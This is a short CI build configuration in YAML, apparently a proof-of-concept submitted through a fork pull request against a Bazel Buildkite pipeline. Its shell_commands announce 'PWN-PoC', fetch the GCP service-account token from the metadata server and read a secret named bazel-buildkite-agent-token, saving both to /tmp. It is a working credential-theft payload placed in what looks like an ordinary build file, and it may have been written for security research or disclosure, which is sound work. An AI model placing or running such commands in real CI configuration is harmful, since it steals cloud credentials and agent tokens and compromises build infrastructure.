---
platforms:
  ubuntu2204:
    shell_commands:
      - echo "PWN-PoC: fork-PR controlled command executing on the CI agent"
      - curl -s -H "Metadata-Flavor: Google" "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token" > /tmp/sa-token.json
      - gcloud secrets versions access latest --secret=bazel-buildkite-agent-token --project=bazel-untrusted > /tmp/org-agent-token.txt
    build_targets:
    - "//:all"
